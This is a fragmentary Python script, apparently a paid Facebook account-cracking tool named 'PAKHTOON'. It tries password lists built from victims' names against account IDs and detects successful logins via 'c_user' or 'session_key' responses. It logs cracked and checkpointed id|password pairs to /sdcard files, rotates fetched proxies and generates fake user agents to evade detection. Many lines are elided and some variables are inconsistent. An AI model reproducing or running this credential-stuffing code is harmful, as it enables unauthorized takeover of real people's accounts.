...
try:
	prox= requests.get('https://raw.githubusercontent.com/leo/data/main/proxies.txt').text
...
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.2;'
...
----------------------------------------------
 Author    : ANJAN
 Github    : https://github.com/Leo998800
 Facebook  : LEO
 Tool Name : PAKHTOON
 Tool type : PAID
 Version:7.5
----------------------------------------------
 Sorry DON'T USE MY TOOL 💔
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [Leo998800] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                print('\r\r\033[1;32m [LEO-OK] %s | %s'%(ids,pas))
                                open('/sdcard/LEO-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in LEO:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [LEO-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LEO-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [LEO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LEO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[LEO-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [LEO-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LEO-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [LEO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/LEO-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
